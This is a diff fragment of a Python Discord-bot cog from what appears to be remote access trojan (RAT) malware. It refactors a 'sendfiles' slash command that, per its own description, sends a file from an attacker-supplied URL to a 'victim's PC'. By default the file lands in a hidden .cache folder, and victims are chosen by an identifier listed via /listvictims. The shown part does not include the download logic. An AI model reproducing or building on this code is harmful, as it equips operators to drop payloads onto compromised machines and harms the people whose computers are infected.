@@ -8,19 +8,19 @@ nr_working = f"C:\\Users\\{os.getenv('username')}\\.cache"
 class SendFiles(commands.Cog):
     def __init__(self, bot: commands.Bot):
         self.bot = bot
-        self.ip_addr = self.bot.ip_addr
         
-    @commands.slash_command(
-        description="Send file to victim's PC",
-        options=[
-            bot.victim,
-            discord.Option("url", description="Direct link to the file for sending", required=True),
-            discord.Option("file_name", description="Name of the file after sending to PC", required=True),
-            discord.Option("file_path", description="Path to which the file should be saved", required=False),
-        ]
-    )
+    @commands.slash_command( )
     async def sendfiles(self, ctx, victim, url, file_name, file_path=nr_working):
-        if str(victim) == str(self.ip_addr):
+        """Send file to victim's PC
+
+        Parameters
+        ----------
+        victim: Identifier of the affected computer (found via /listvictims).
+        url: Direct link to the file for sending
+        file_name: Name of the file after sending to PC
+        file_path: Path to which the file should be saved
+        """
+        if str(victim) == str(self.bot.identifier):
             await ctx.response.defer()
             
             if '"' in file_path:
